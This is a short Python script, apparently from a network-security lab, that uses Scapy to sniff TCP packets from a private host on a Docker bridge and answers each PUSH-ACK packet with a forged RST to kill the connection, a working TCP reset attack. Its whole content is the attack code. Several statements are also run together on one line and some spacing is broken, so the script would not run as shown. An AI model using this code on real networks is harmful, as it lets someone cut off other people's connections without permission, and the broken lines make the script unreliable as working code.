#!/usr/bin/env python3 
from scapy.all import * 
def spoof(pkt): 
    # only for the PUSH ACK flags packet, it ensures send one RST packet 
    if(pkt[TCP].flags == 'PA'): 
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) 
        tcp = TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="R",seq=pkt[ TCP].ack)
        new_pkt = ip/tcp ls(new_pkt) send(new_pkt,verbose=0) 
        print("A RST packet send") 
sniff(filter='ip src 10.9.0.7 and tcp',iface='br- 8726acde940e',prn=spoof)
